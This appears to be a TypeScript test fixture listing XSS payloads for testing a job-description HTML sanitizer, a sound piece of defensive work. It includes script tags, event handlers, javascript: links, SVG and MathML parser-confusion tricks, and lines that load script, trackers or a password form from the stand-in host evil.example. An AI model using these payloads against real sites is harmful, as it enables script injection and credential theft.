/**
 * Hostile job descriptions for the sanitizer tests. Each one tries to run script, load something, or leave an
 * attribute behind. A payload that works sets `window.__xss`, so a test in a real browser can tell.
 *
 * Not part of the app: only sanitize.test.ts imports this.
 */
export const XSS_PAYLOADS: string[] = [
  // Script in the open.
  '<script>window.__xss=1</script>',
  '<SCRIPT SRC="https://evil.example/x.js"></SCRIPT>',
  '<p>before<script>window.__xss=1</script>after</p>',
  '<scr<script>ipt>window.__xss=1</scr</script>ipt>',
  '<script/x>window.__xss=1</script>',
  '<script\n>window.__xss=1</script\n>',

  // Event handlers, on tags the sanitizer keeps and on tags it does not.
  '<img src=x onerror="window.__xss=1">',
  '<img src="x" onerror=window.__xss=1 />',
  '<p onclick="window.__xss=1" onmouseover="window.__xss=1">text</p>',
  '<div onpointerenter=window.__xss=1 style="position:fixed;inset:0">cover</div>',
  '<b onfocus=window.__xss=1 tabindex=0 autofocus>bold</b>',
  '<body onload=window.__xss=1>',
  '<details open ontoggle=window.__xss=1><summary>more</summary>hidden</details>',
  '<marquee onstart=window.__xss=1>scroll</marquee>',
  '<video autoplay onloadstart=window.__xss=1><source src=x onerror=window.__xss=1></video>',
  '<audio src=x onerror=window.__xss=1>',
  '<input autofocus onfocus=window.__xss=1>',
  '<select autofocus onfocus=window.__xss=1><option>a</option></select>',
  '<textarea autofocus onfocus=window.__xss=1>t</textarea>',
  '<button formaction="javascript:window.__xss=1" onclick=window.__xss=1>go</button>',
  '<keygen autofocus onfocus=window.__xss=1>',

  // Links that are not web links.
  '<a href="javascript:window.__xss=1">click</a>',
  '<a href="JaVaScRiPt:window.__xss=1">click</a>',
  '<a href=" javascript:window.__xss=1">click</a>',
  '<a href="java\tscript:window.__xss=1">click</a>',
  '<a href="java&#x0A;script:window.__xss=1">click</a>',
  '<a href="&#106;avascript:window.__xss=1">click</a>',
  '<a href="\u0001javascript:window.__xss=1">click</a>',
  '<a href="data:text/html,<script>window.__xss=1</script>">click</a>',
  '<a href="vbscript:msgbox(1)">click</a>',
  '<a href="//evil.example/path">click</a>',
  '<a href="/relative/path">click</a>',
  '<a href="mailto:someone@example.com">click</a>',
  '<a href="file:///etc/passwd">click</a>',
  '<a href="blob:https://evil.example/1234">click</a>',
  '<a href="https://ok.example/" onclick="window.__xss=1" style="color:red" target="_top" rel="opener" id="location" name="cookie" class="c" download>fine link, bad extras</a>',
  '<a href="https://ok.example/?q=%22%3E%3Cscript%3Ewindow.__xss=1%3C/script%3E">encoded</a>',
  '<a href=\'https://ok.example/"><img src=x onerror=window.__xss=1>\'>quote in the address</a>',
  '<a xlink:href="javascript:window.__xss=1">xlink</a>',

  // Things that load or embed.
  '<iframe src="javascript:window.__xss=1"></iframe>',
  '<iframe srcdoc="<script>parent.__xss=1</script>"></iframe>',
  '<object data="javascript:window.__xss=1"></object>',
  '<embed src="javascript:window.__xss=1">',
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<meta http-equiv="refresh" content="0;url=javascript:window.__xss=1">',
  '<base href="https://evil.example/">',
  '<style>*{background:url("https://evil.example/track")}</style>',
  '<style>@import "https://evil.example/x.css";</style>',
  '<p style="background:url(https://evil.example/track)">styled</p>',
  '<img src="https://evil.example/track.gif">',
  '<picture><source srcset="https://evil.example/a.png"><img src="https://evil.example/b.png"></picture>',
  '<form action="https://evil.example/steal"><input name="password" type="password"><input type="submit"></form>',
  '<form id="f"></form><button form="f" formaction="https://evil.example/">send</button>',
  '<portal src="https://evil.example/"></portal>',
  '<frameset><frame src="javascript:window.__xss=1"></frameset>',
  '<applet code="x"></applet>',

  // SVG and MathML, where the parser changes its rules.
  '<svg onload=window.__xss=1></svg>',
  '<svg><script>window.__xss=1</script></svg>',
  '<svg><a xlink:href="javascript:window.__xss=1"><text y="20">click</text></a></svg>',
  '<svg><animate onbegin=window.__xss=1 attributeName=x dur=1s>',
  '<svg><set attributeName="onmouseover" to="window.__xss=1">',
  '<svg><foreignObject><p>inside<img src=x onerror=window.__xss=1></p></foreignObject></svg>',
  '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>window.__xss=1</script></svg>#x">',
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=x onerror=window.__xss=1&gt;">',
  '<math><annotation-xml encoding="text/html"><img src=x onerror=window.__xss=1></annotation-xml></math>',
  '<math href="javascript:window.__xss=1">click</math>',
  '<svg></p><style><a id="</style><img src=x onerror=window.__xss=1>">',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=window.__xss=1>',

  // Markup that reads differently the second time it is parsed.
  '<noscript><p title="</noscript><img src=x onerror=window.__xss=1>">',
  '<template><script>window.__xss=1</script></template>',
  '<div><template><img src=x onerror=window.__xss=1></template></div>',
  '<textarea></textarea><img src=x onerror=window.__xss=1>',
  '<title></title><img src=x onerror=window.__xss=1>',
  '<xmp><img src=x onerror=window.__xss=1></xmp><img src=x onerror=window.__xss=1>',
  '<plaintext><img src=x onerror=window.__xss=1>',
  '<listing>&lt;img src=x onerror=window.__xss=1&gt;</listing>',
  '<!--<img src="--><img src=x onerror=window.__xss=1>',
  '<![CDATA[<img src=x onerror=window.__xss=1>]]>',
  '<?xml version="1.0"?><img src=x onerror=window.__xss=1>',
  '<p title="&lt;img src=x onerror=window.__xss=1&gt;">entity in an attribute</p>',
  '<a href="https://ok.example/" title="\'><img src=x onerror=window.__xss=1>">attribute breakout</a>',
  '<table><tr><td><a href="javascript:window.__xss=1">cell</a></td></tr><img src=x onerror=window.__xss=1></table>',
  '<table background="javascript:window.__xss=1"><tr><td background="https://evil.example/t.gif">cell</td></tr></table>',
  '<ul><li><script>window.__xss=1</script>item</li></ul>',
  '<h1 onclick=window.__xss=1><span onmouseover=window.__xss=1><em onfocus=window.__xss=1>nested</em></span></h1>',

  // Names that shadow parts of the page.
  '<a id="location" href="https://ok.example/">shadow</a>',
  '<form name="body"><input name="attributes"><input name="innerHTML"></form>',
  '<div id="root">another root</div><span id="defaultView">x</span>',
  '<img name="cookie"><img name="getElementById">',

  // Text that only looks like markup must stay text.
  '&lt;script&gt;window.__xss=1&lt;/script&gt;',
  'Salary &lt; $90k &amp; equity <b>bold</b> a < b > c',
  '<p>Uses C++, C# and <unknown-tag>F#</unknown-tag></p>',
];
